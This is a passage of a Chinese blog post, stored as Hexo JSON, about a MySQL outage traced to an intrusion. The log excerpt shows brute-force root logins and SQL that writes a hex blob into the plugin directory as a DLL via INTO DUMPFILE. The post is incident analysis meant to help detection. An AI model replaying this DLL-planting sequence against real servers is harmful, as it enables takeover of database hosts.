(temp>max)\n        {\n            max = temp;\n            maxindex =i;\n        }\n    }\n    console.log(max);\n    var txt = \"max:\"+max+\"\\n\\r\";\n    txt= txt + str.substr(arr[maxindex],max)\n    fs.writeFile('result.txt', txt, function (err) {\n        if (err) throw err;\n        console.log('It\\'s saved!'); \n    });\n});\n```\n\n执行程序查询日志之后发现我们的mysql已被人入侵\n```sql\n160623 18:35:05\t84 Connect\troot@114.55.39.75 on mysql\n84 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:08\t85 Connect\troot@114.55.39.75 on mysql\n85 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:11\t86 Connect\troot@114.55.39.75 on mysql\n86 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:15\t87 Connect\troot@114.55.39.75 on mysql\n87 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:17\t88 Connect\troot@114.55.39.75 on mysql\n88 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:18\t89 Connect\troot@114.55.39.75 on mysql\n89 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:21\t90 Connect\troot@114.55.39.75 on mysql\n90 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:23\t91 Connect\troot@114.55.39.75 on mysql\n91 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:26\t92 Connect\troot@114.55.39.75 on mysql\n92 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:34\t93 Connect\troot@114.55.39.75 on mysql\n160623 18:35:35\t93 Query\tset autocommit=0\n160623 18:35:36\t93 Quit\t\n160623 18:35:37\t94 Connect\troot@114.55.39.75 on mysql\n94 Query\tset autocommit=0\n94 Query\tSELECT VERSION()\n160623 18:35:38\t94 Query\tset @a = concat('',0xn94 Query\tuse mysql\n94 Query\tdrop table IF EXISTS yongger2\n94 Query\tSHOW WARNINGS\n94 Query\tcreate table yongger2(data LONGBLOB)\n160623 18:35:39\t94 Query\tinsert into yongger2 values(\"\")\n94 Query\tupdate yongger2 set data = @a\n94 Query\tset @dir2 = concat('select data from yongger2 into DUMPFILE \"',@@plugin_dir,'\\\\cna12.dll\"')\n94 Query\tset @dir2 = replace(@dir2,'\\\\','\\\\\\\\')\n94 Query\tset @dir2 = replace(@dir2,\"/\",\"\\\\\\\\\")\n160623 18:35:40\t94 Query\tprepare sql3 from @dir2\n94 Prepare\tselect data from yongger2 into DUMPFILE \"C:\\\\Program Files (x86)\\\\MySQL\\\\MySQL Server 5.6\\\\lib\\\\plugin\\\\\\\\cna12.dll\"\n....\n....\n....\n后面1W行省略\n```\n\n后面的内容真是看不下去,种了无数dll到服务器上。整个服务器被控制。\n然后。。。。我就没有然后了。。。。。。。。。。。。\n\n## 最后\n\n遇到这种情况，好像只能重装系统了。\n特别要注意的是:0x4D5A是pe文件头，如果你的日志中出现这个，请提高警觉。\nPS:PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）\n\n\n","slug":"hishop-4","published":1,"updated":"2016-06-25T16:44:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt6000ig2x6pcb0xqi0","content":"<h2 id=\"情况\"><a href=\"#情况\" class=\"headerlink\" title=\"情况\"></a>情况</h2><p>最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢复正常。<br>查找错误日志,以下为错误堆栈信息:<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MySql.Data.MySqlClient.MySqlException (<span class=\"number\">0x80004005</span>): Packets larger than max_allowed_packet are not allowed.</span><br><span class=\"line\">在 MySql.Data.MySqlClient.MySqlStream.SendPacket(MySqlPacket packet)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.NativeDriver.ExecutePacket(MySqlPacket packetToExecute)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.NativeDriver.SendQuery(MySqlPacket queryPacket)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.Driver.SendQuery(MySqlPacket p)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.Statement.ExecuteNext()</span><br><span class=\"line\">在 MySql.Data.MySqlClient.MySqlCommand.ExecuteReader(CommandBehavior behavior)</span><br><span class=\"line\">在 MySql.Data.Entity.EFMySqlCommand.ExecuteDbDataReader(CommandBehavior behavior)</span><br><span class=\"line\">在 System.Data.Entity.Infrastructure.Interception.InternalDispatcher`<span class=\"number\">1.</span>Dispatch[TTarget,TInterceptionContext,TResult](TTarget target, Func`<span class=\"number\">3</span> operation, TInterceptionContext interceptionContext, Action`<span class=\"number\">3</span> executing, Action`<span class=\"number\">3</span> executed)</span><br><span class=\"line\">在 System.Data.Entity.Infrastructure.Interception.DbCommandDispatcher.Reader(DbCommand command, DbCommandInterceptionContext interceptionContext)</span><br><span class=\"line\">在 System.Data.Entity.Core.EntityClient.Internal.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior)</span><br></pre></td></tr></table></figure></p>\n<p>问题原因是:Packets larger than max_allowed_packet are not allowed.<br>查看官网解释:<br>When a MySQL client or the mysqld server receives a packet bigger than max_allowed_packet bytes, it issues an ER_NET_PACKET_TOO_LARGE error and closes the connection. With some clients, you may also get a Lost connection to MySQL server during query error if the communication packet is too large.<br>Both the client and the server have their own max_allowed_packet variable, so if you want to handle big packets, you must increase this variable both in the client and in the server.<br>按官文文档的解释是你的sql命令太长。</p>\n<h2 id=\"排查问题\"><a href=\"#排查问题\" class=\"headerlink\" title=\"排查问题\"></a>排查问题</h2><p>随即把mysql max_allowed_packet调到20M仍无法解决，网站依就无法访问数据库，仍然出现相同的错误。苦思无果之后，只有从.net mysqlclient源码查起。<br>出错源码为MysqlSteam.cs</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">SendPacket</span>(<span class=\"params\">MySqlPacket packet</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">byte</span>[] buffer = packet.Buffer;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> length = packet.Position - <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"keyword\">ulong</span>)length &gt; maxPacketSize)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> MySqlException(Resources.QueryTooLarge (<span class=\"keyword\">int</span>)MySqlErrorCode.PacketTooLarge);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (length &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> lenToSend = length &gt; maxBlockSize ? maxBlockSize : length;</span><br><span class=\"line\">        buffer[offset] = (<span class=\"keyword\">byte</span>)(lenToSend &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        buffer[offset + <span class=\"number\">1</span>] = (<span class=\"keyword\">byte</span>)((lenToSend &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        buffer[offset + <span class=\"number\">2</span>] = (<span class=\"keyword\">byte</span>)((lenToSend &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        buffer[offset + <span class=\"number\">3</span>] = sequenceByte++;</span><br><span class=\"line\">        </span><br><span class=\"line\">        outStream.Write(buffer, offset, lenToSend + <span class=\"number\">4</span>);</span><br><span class=\"line\">        outStream.Flush();</span><br><span class=\"line\">        length -= lenToSend;</span><br><span class=\"line\">        offset += lenToSend;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查找maxPacketSize的来源<br>Driver.cs<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">virtual</span> <span class=\"keyword\">void</span> <span class=\"title\">Configure</span>(<span class=\"params\">MySqlConnection connection</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> firstConfigure = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// if we have not already configured our server variables</span></span><br><span class=\"line\">    <span class=\"comment\">// then do so now</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (serverProps == <span class=\"literal\">null</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    firstConfigure = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"comment\">// if we are in a pool and the user has said it's ok to cache the</span></span><br><span class=\"line\">\t<span class=\"comment\">// properties, then grab it from the pool</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Pool != <span class=\"literal\">null</span> &amp;&amp; Settings.CacheServerProperties)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Pool.ServerProperties == <span class=\"literal\">null</span>)</span><br><span class=\"line\">          Pool.ServerProperties = LoadServerProperties(connection);</span><br><span class=\"line\">            serverProps = Pool.ServerProperties;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            serverProps = LoadServerProperties(connection);</span><br><span class=\"line\">        </span><br><span class=\"line\">        LoadCharacterSets(connection);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (MySqlException ex)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// expired password capability</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ex.Number == <span class=\"number\">1820</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            IsPasswordExpired = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t.......</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (serverProps.ContainsKey(<span class=\"string\">\"max_allowed_packet\"</span>))</span><br><span class=\"line\">\t    maxPacketSize = Convert.ToInt64(serverProps[<span class=\"string\">\"max_allowed_packet\"</span>]);</span><br><span class=\"line\">\t.......</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>继续查找LoadServerProperties，仍在Driver.cs中</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> Dictionary&lt;<span class=\"keyword\">string</span>,<span class=\"keyword\">string</span>&gt; LoadServerProperties(MySqlConnection connection)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// load server properties</span></span><br><span class=\"line\">    Dictionary&lt;<span class=\"keyword\">string</span>, <span class=\"keyword\">string</span>&gt; hash = <span class=\"keyword\">new</span> Dictionary&lt;<span class=\"keyword\">string</span>, <span class=\"keyword\">string</span>&gt;();</span><br><span class=\"line\">    MySqlCommand cmd = <span class=\"keyword\">new</span> MySqlCommand(<span class=\"string\">\"SHOW VARIABLES\"</span>, connection);</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">using</span> (MySqlDataReader reader = cmd.ExecuteReader())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (reader.Read())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">string</span> key = reader.GetString(<span class=\"number\">0</span>);</span><br><span class=\"line\">                <span class=\"keyword\">string</span> <span class=\"keyword\">value</span> = reader.GetString(<span class=\"number\">1</span>);</span><br><span class=\"line\">                hash[key] = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// Get time zone offset as numerical value</span></span><br><span class=\"line\">        timeZoneOffset = GetTimeZoneOffset(connection);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (Exception ex)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        MySqlTrace.LogError(ThreadID, ex.Message);</span><br><span class=\"line\">        <span class=\"keyword\">throw</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>客户端的max_allowed_packet也是从服务器获取下来的.<br>所以就没办法解释这个问题，查找mysql错误日志，没有任何错误信息。最后只好把mysql普通日志打开。<br>set global general_log = on</p>\n<p>当天傍晚服务器依就挂掉，整个网站的所有页面无法访问数据库.sql日志100多m，非常不便于查看，用nodejs写了一个查找最长sql语句的方法.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fs = require(&apos;fs&apos;);</span><br><span class=\"line\">var str = &quot;&quot;;</span><br><span class=\"line\">fs.readFile(&apos;mysql.log&apos;, &apos;utf8&apos;, function (err, data) &#123;</span><br><span class=\"line\">    if (err) throw err;</span><br><span class=\"line\">    str = data;</span><br><span class=\"line\">    searchkey = &apos;Query SELECT&apos;;</span><br><span class=\"line\">    var pos = str.indexOf(searchkey);</span><br><span class=\"line\">    var arr=new Array();</span><br><span class=\"line\">    arr[0] = pos;</span><br><span class=\"line\">    var k = 1;</span><br><span class=\"line\">    var count = 0;</span><br><span class=\"line\">    while (pos !== -1) &#123;</span><br><span class=\"line\">        count++;</span><br><span class=\"line\">        pos = str.indexOf(searchkey, pos + 1);</span><br><span class=\"line\">        arr[k] = pos;</span><br><span class=\"line\">        k++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var max =0;</span><br><span class=\"line\">    var maxindex = 0;</span><br><span class=\"line\">    for (var i=0;i&lt;arr.length-2;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        var temp = arr[i+1] -arr[i];</span><br><span class=\"line\">        if (temp&gt;max)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            max = temp;</span><br><span class=\"line\">            maxindex =i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(max);</span><br><span class=\"line\">    var txt = &quot;max:&quot;+max+&quot;\\n\\r&quot;;</span><br><span class=\"line\">    txt= txt + str.substr(arr[maxindex],max)</span><br><span class=\"line\">    fs.writeFile(&apos;result.txt&apos;, txt, function (err) &#123;</span><br><span class=\"line\">        if (err) throw err;</span><br><span class=\"line\">        console.log(&apos;It\\&apos;s saved!&apos;); </span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>执行程序查询日志之后发现我们的mysql已被人入侵<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">160623 18:35:05\t84 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">84 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:08\t85 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">85 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:11\t86 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">86 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:15\t87 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">87 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:17\t88 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">88 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:18\t89 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">89 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:21\t90 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">90 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:23\t91 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">91 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:26\t92 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">92 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:34\t93 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">160623 18:35:35\t93 Query\t<span class=\"keyword\">set</span> autocommit=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">36</span>\t<span class=\"number\">93</span> Quit\t</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">37</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Connect</span>\troot@<span class=\"number\">114.55</span><span class=\"number\">.39</span><span class=\"number\">.75</span> <span class=\"keyword\">on</span> mysql</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> autocommit=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">SELECT</span> <span class=\"keyword\">VERSION</span>()</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">38</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @a = <span class=\"keyword\">concat</span>(<span class=\"string\">''</span>,<span class=\"number\">0xspan>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">use</span> mysql</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">drop</span> <span class=\"keyword\">table</span> <span class=\"keyword\">IF</span> <span class=\"keyword\">EXISTS</span> yongger2</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">SHOW</span> <span class=\"keyword\">WARNINGS</span></span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">create</span> <span class=\"keyword\">table</span> yongger2(<span class=\"keyword\">data</span> LONGBLOB)</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">39</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> yongger2 <span class=\"keyword\">values</span>(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">update</span> yongger2 <span class=\"keyword\">set</span> <span class=\"keyword\">data</span> = @a</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @dir2 = <span class=\"keyword\">concat</span>(<span class=\"string\">'select data from yongger2 into DUMPFILE \"'</span>,@@plugin_dir,<span class=\"string\">'\\\\cna12.dll\"'</span>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @dir2 = <span class=\"keyword\">replace</span>(@dir2,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\\\\\\\'</span>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @dir2 = <span class=\"keyword\">replace</span>(@dir2,<span class=\"string\">\"/\"</span>,<span class=\"string\">\"\\\\\\\\\"</span>)</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">40</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">prepare</span> sql3 <span class=\"keyword\">from</span> @dir2</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Prepare</span>\t<span class=\"keyword\">select</span> <span class=\"keyword\">data</span> <span class=\"keyword\">from</span> yongger2 <span class=\"keyword\">into</span> <span class=\"keyword\">DUMPFILE</span> <span class=\"string\">\"C:\\\\Program Files (x86)\\\\MySQL\\\\MySQL Server 5.6\\\\lib\\\\plugin\\\\\\\\cna12.dll\"</span></span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">后面<span class=\"number\">1</span>W行省略</span><br></pre></td></tr></table></figure></p>\n<p>后面的内容真是看不下去,种了无数dll到服务器上。整个服务器被控制。<br>然后。。。。我就没有然后了。。。。。。。。。。。。</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>遇到这种情况，好像只能重装系统了。<br>特别要注意的是:0x4D5A是pe文件头，如果你的日志中出现这个，请提高警觉。<br>PS:PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）</p>\n","excerpt":"","more":"<h2 id=\"情况\"><a href=\"#情况\" class=\"headerlink\" title=\"情况\"></a>情况</h2><p>最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢复正常。<br>查找错误日志,以下为错误堆栈信息:<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MySql.Data.MySqlClient.MySqlException (<span class=\"number\">0x80004005</span>): Packets larger than max_allowed_packet are not allowed.</span><br><span class=\"line\">在 MySql.Data.MySqlClient.MySqlStream.SendPacket(MySqlPacket packet)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.NativeDriver.ExecutePacket(MySqlPacket packetToExecute)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.NativeDriver.SendQuery(MySqlPacket queryPacket)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.Driver.SendQuery(MySqlPacket p)</span><br><span class=\"line\">在 MySql.Data.MySqlClient.Statement.ExecuteNext()</span><br><span class=\"line\">在 MySql.Data.MySqlClient.MySqlCommand.ExecuteReader(CommandBehavior behavior)</span><br><span class=\"line\">在 MySql.Data.Entity.EFMySqlCommand.ExecuteDbDataReader(CommandBehavior behavior)</span><br><span class=\"line\">在 System.Data.Entity.Infrastructure.Interception.InternalDispatcher`<span class=\"number\">1.</span>Dispatch[TTarget,TInterceptionContext,TResult](TTarget target, Func`<span class=\"number\">3</span> operation, TInterceptionContext interceptionContext, Action`<span class=\"number\">3</span> executing, Action`<span class=\"number\">3</span> executed)</span><br><span class=\"line\">在 System.Data.Entity.Infrastructure.Interception.DbCommandDispatcher.Reader(DbCommand command, DbCommandInterceptionContext interceptionContext)</span><br><span class=\"line\">在 System.Data.Entity.Core.EntityClient.Internal.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior)</span><br></pre></td></tr></table></figure></p>\n<p>问题原因是:Packets larger than max_allowed_packet are not allowed.<br>查看官网解释:<br>When a MySQL client or the mysqld server receives a packet bigger than max_allowed_packet bytes, it issues an ER_NET_PACKET_TOO_LARGE error and closes the connection. With some clients, you may also get a Lost connection to MySQL 